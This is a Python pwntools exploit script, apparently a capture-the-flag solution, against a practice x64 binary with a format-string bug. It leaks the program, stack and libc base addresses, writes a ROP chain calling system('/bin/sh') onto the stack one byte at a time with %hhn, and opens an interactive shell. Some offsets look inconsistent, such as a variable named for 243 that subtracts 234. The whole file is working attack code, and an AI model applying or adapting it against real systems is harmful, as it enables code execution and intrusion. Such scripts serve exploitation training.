#!/usr/bin/env python
# coding=utf-8
from pwn import *
import duchao_pwn_script
arch = 'amd64'
duchao_pwn_script.init_pwn_linux(arch)
pwnfile= './fmt_str_level_2_buf_x64'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)
libc =ELF("/lib/x86_64-linux-gnu/libc.so.6")
# 泄露基地址，包含1.文件基地址
dem = 'hello\n'
io.recvuntil(dem)
payload4searchbase = b"%9$p"
io.sendline(payload4searchbase)
main_18 = int(io.recv()[2:14],16)
file_base = main_18 - elf.symbols['main'] -  18
print("file_base is :",hex(file_base))
printf_got = file_base + elf.got["printf"]
pop_rdi_ret_offset = 0x012a3
pop_rdi_ret_addr = pop_rdi_ret_offset + file_base

# 泄露栈地址
payload_search_stack  = b'%6$p'
io.sendline(payload_search_stack)
stack_1 = int(io.recv()[2:14],16)
stack_0 = stack_1 - 0x10
offset_0 = 0
offset_1 = 2
offset_2 = 22
# offset_3 = 41
stack_2 = stack_0 + offset_2 * 8
# stack_3 = stack_0 + offset_3 * 8
payload_search_stack  = b"%"+ str(offset_2 + 6).encode("utf-8")  +b"$p"
io.sendline(payload_search_stack)
stack_3 = int(io.recv()[2:14],16)
offset_3 = (stack_3 - stack_0)//8 + 6 

#泄露libc地址
payload4searchlibc = b"%11$p"
io.sendline(payload4searchlibc)
libc_start_main_243 = int(io.recv()[2:14],16)
libc_base = libc_start_main_243 - libc.symbols['__libc_start_main'] -  234
print("libc_base is :",hex(libc_base))
sys_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
sys_addr_1 = sys_addr & 0xffff
sys_addr_2 = (sys_addr >> 16)& 0xffff
sys_addr_3 = (sys_addr >> 32)& 0xffff
sys_addr_4 = (sys_addr >> 48)& 0xffff
print("system is :",hex(sys_addr))
print("bin_sh_addr is :",hex(binsh_addr))
print("system_addr1 is :",hex(sys_addr_1))
print("system_addr2 is :",hex(sys_addr_2))
print("system_addr3 is :",hex(sys_addr_3))
print("system_addr4 is :",hex(sys_addr_4))

print("stack_0 is :",hex(stack_0))
print("stack_1 is :",hex(stack_1))
print("stack_2 is :",hex(stack_2))
print("stack_3 is :",hex(stack_3))
# duchao_pwn_script.dbg(io)
pause()
def fmt_ch_one_byte(offset1, offset2, addr, data, dmite=""):
    '''
    单字节模式
    :param offset1:第一偏移位值，此内存保存第二个地址值
    :param offset2:第二个偏移值，此内存保存目标地址值
    :param addr:目标地址，
    :param data:写入的数据
    注意：此方法当目标地址的后2位在0xFD-0xFF时程序会失败，此时需要多试几次
    '''
    addr_4 = addr & 0xFF
    for i in range(context.word_size // 8):
        if (addr_4 + i) == 0:
            payload = '%' + str(offset1) + '$hhn\x00'
        else:
            payload = '%' + str(addr_4 + i) + 'c%' + str(offset1) + '$hhn\x00'
        sleep(1)
        # pause()
        # sl(payload)
        io.sendline(payload)  # sl sla 需要根据情况调整
        data_t = (data >> i * 8) & 0XFF
        if data_t == 0:
            payload = '%' + str(offset2) + '$hhn\x00'
        else:
            payload = '%' + str(data_t) + 'c%' + str(offset2) + '$hhn\x00'
        sleep(1)
        # pause()
        # sl(payload)
        io.sendline(payload)  # sl sla 需要根据情况调整
    # 恢复offset2中存储的addr的最后1个字节
    payload = '%' + str(addr_4) + 'c%' + str(offset1) + '$hhn\x00'
    sleep(1)
    # sl(payload)
    io.sendline(payload)  # sl sla 需要根据情况调整
rbp_addr = stack_0 +0x10

fmt_ch_one_byte(6 , 8 , stack_2 , rbp_addr+0x8 )
fmt_ch_one_byte(8 , 22+6 ,rbp_addr + 0x8 ,pop_rdi_ret_addr )
duchao_pwn_script.dbg(io)
fmt_ch_one_byte(6 , 8 , stack_2 , rbp_addr+0x10 )
fmt_ch_one_byte(8 , 22+6 ,rbp_addr + 0x10 ,binsh_addr )
fmt_ch_one_byte(6 , 8 , stack_2 , rbp_addr+0x8 )
fmt_ch_one_byte(8 , 22+6 ,rbp_addr + 0x18 ,sys_addr )

duchao_pwn_script.dbg(io)
io.interactive()


